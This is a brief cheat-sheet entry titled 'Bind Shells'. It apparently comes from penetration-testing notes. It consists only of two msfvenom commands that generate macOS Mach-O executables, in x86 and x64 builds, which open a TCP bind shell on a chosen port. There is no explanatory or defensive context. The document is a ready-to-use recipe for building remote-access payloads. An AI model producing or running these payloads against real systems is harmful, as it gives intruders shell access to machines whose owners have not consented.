# Bind Shells

`$ msfvenom -p osx/x86/shell_bind_tcp lport=<PORT> -f macho -o shell_x86`

`$ msfvenom -p osx/x64/shell_bind_tcp lport=<PORT> -f macho -o shell_x64`